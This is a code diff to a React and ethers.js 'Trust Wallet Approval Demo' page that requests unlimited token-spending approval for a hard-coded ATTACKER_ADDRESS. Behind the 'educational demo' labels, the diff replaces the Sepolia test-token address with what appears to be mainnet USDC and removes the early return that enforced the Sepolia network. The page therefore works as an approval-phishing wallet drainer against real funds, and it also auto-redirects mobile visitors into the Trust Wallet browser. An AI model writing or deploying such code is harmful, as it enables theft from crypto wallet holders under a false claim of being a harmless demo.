@@ -6,24 +6,21 @@ import { ethers } from "ethers";
 ========================= */
 
 // ✅ USDC on Sepolia
-const TOKEN_ADDRESS = "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238";
+const TOKEN_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
-// ⚠️  address (permission receiver)
+// ⚠️ Demo permission receiver (NO transfer logic used)
 const ATTACKER_ADDRESS = "0x23F1887aB3D6Eb129D32B209E29b102dB7E07F31";
 
-// ERC20 ABI
+// Minimal ERC20 ABI
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
   "function allowance(address owner, address spender) view returns (uint256)",
   "function symbol() view returns (string)",
-
   "function name() view returns (string)",
-  "function transfer(address to, uint256 amount) returns (bool)",
-  "event Approval(address indexed owner, address indexed spender, uint256 value)",
-  "event Transfer(address indexed from, address indexed to, uint256 value)",
 ];
+
 // Unlimited approval value
 const UNLIMITED =
   "115792089237316195423570985008687907853269984665640564039457584007913129639935";
@@ -34,37 +31,32 @@ function App() {
   const [token, setToken] = useState(null);
   const [logs, setLogs] = useState([]);
   const [loading, setLoading] = useState(false);
+  const [connecting, setConnecting] = useState(false);
   const [isTrustWallet, setIsTrustWallet] = useState(false);
   const [step, setStep] = useState(1);
 
   /* =========================
      HELPERS
   ========================= */
-
   const addLog = (msg) => setLogs((p) => [...p, msg]);
   const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
   /* =========================
      TRUST WALLET DETECTION
-     (Runs once on load)
   ========================= */
-
   useEffect(() => {
-    // ❌ Desktop browser / MetaMask
     if (!window.ethereum?.isTrust) {
       addLog("❌ Trust Wallet browser not detected");
 
-      // 👉 Mobile user? Auto-open Trust Wallet
+      // 👉 Mobile deep-link to Trust Wallet Browser
       const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
       if (isMobile) {
         const url = encodeURIComponent(window.location.href);
-        window.location.href =
-          `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
+        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
       }
       return;
     }
 
-    // ✅ Correct environment
     setIsTrustWallet(true);
     addLog("📱 Trust Wallet detected");
   }, []);
@@ -72,31 +64,30 @@ function App() {
   /* =========================
      CONNECT TRUST WALLET
   ========================= */
-
   const connectWallet = async () => {
+    if (connecting) return; // prevent double request
+
     try {
+      setConnecting(true);
+
       if (!window.ethereum?.isTrust) {
         alert("Please open this site inside Trust Wallet Browser");
         return;
       }
 
-      // ✅ Trust Wallet requires direct request
-      await window.ethereum.request({
-        method: "eth_requestAccounts",
-      });
+      // Trust Wallet compatible request
+      await window.ethereum.request({ method: "eth_requestAccounts" });
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = provider.getSigner();
       const address = await signer.getAddress();
       const ethBalance = await provider.getBalance(address);
 
-      // ✅ Enforce Sepolia
+      // Enforce Sepolia
       const network = await provider.getNetwork();
       if (network.chainId !== 11155111) {
         addLog("❌ Switch Trust Wallet to Sepolia network");
-        return;
       }
-
       const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
 
       setSigner(signer);
@@ -111,22 +102,25 @@ function App() {
       setStep(2);
     } catch (err) {
       console.error(err);
-      if (err.code === 4001) {
+      if (err.code === -32002) {
+        addLog("⏳ Connection request already pending in Trust Wallet");
+      } else if (err.code === 4001) {
         addLog("❌ User rejected connection");
       } else {
         addLog("❌ Wallet connection failed");
       }
+    } finally {
+      setConnecting(false);
     }
   };
 
   /* =========================
-     SIMULATION
+     SIMULATION (APPROVE ONLY)
   ========================= */
-
   const simulate = async () => {
     try {
       setLoading(true);
-      setLogs([]);
+      // ❌ DO NOT clear logs here (UX fix)
 
       if (!wallet || !token) {
         addLog("❌ Wallet not ready");
@@ -134,20 +128,19 @@ function App() {
       }
 
       addLog("🔍 Checking balance...");
-      await sleep(500);
+      await sleep(400);
 
       const raw = await token.balanceOf(wallet.address);
       const decimals = await token.decimals();
       const balance = ethers.utils.formatUnits(raw, decimals);
-
       addLog(`💰 Balance: ${balance}`);
-      await sleep(500);
+      await sleep(400);
 
       const ok = window.confirm(
         "⚠️ EDUCATIONAL DEMO\n\n" +
-          "This will approve UNLIMITED token spending.\n\nContinue?"
+          "This will approve UNLIMITED token spending.\n" +
+          "No tokens will be transferred by this app.\n\nContinue?"
       );
-
       if (!ok) {
         addLog("❌ User cancelled");
         return;
@@ -176,7 +169,6 @@ function App() {
   /* =========================
      UI
   ========================= */
-
   return (
     <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
       <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
@@ -184,7 +176,16 @@ function App() {
           🔐 Trust Wallet Approval Demo
         </h1>
 
-        {/* CONNECTED BADGE */}
+        {/* Logs (Always Visible) */}
+        {logs.length > 0 && (
+          <div className="bg-black p-3 rounded text-sm space-y-1 mb-3">
+            {logs.map((l, i) => (
+              <div key={i}>{l}</div>
+            ))}
+          </div>
+        )}
+
+        {/* Connected Badge */}
         {wallet && (
           <div className="bg-green-900/30 border border-green-700 text-green-400 text-sm p-2 rounded mb-3 text-center">
             ✅ Wallet Connected
@@ -200,9 +201,12 @@ function App() {
         {step === 1 && (
           <button
             onClick={connectWallet}
-            className="w-full py-3 bg-blue-600 rounded font-bold"
+            disabled={connecting}
+            className={`w-full py-3 rounded font-bold ${
+              connecting ? "bg-gray-600 cursor-not-allowed" : "bg-blue-600"
+            }`}
           >
-            Connect Trust Wallet
+            {connecting ? "Connecting..." : "Connect Trust Wallet"}
           </button>
         )}
 
@@ -217,7 +221,9 @@ function App() {
             <button
               onClick={simulate}
               disabled={loading}
-              className="w-full py-3 bg-red-600 rounded font-bold"
+              className={`w-full py-3 rounded font-bold ${
+                loading ? "bg-gray-600 cursor-not-allowed" : "bg-red-600"
+              }`}
             >
               {loading ? "Processing..." : "Start Simulation"}
             </button>
@@ -225,11 +231,8 @@ function App() {
         )}
 
         {step === 3 && (
-          <div className="bg-black p-3 rounded text-sm space-y-2">
-            {logs.map((l, i) => (
-              <div key={i}>{l}</div>
-            ))}
-            <p className="text-red-400 mt-2">
+          <div className="bg-black p-3 rounded text-sm mt-3">
+            <p className="text-red-400">
               ⚠️ Unlimited approval is dangerous in real life.
             </p>
           </div>
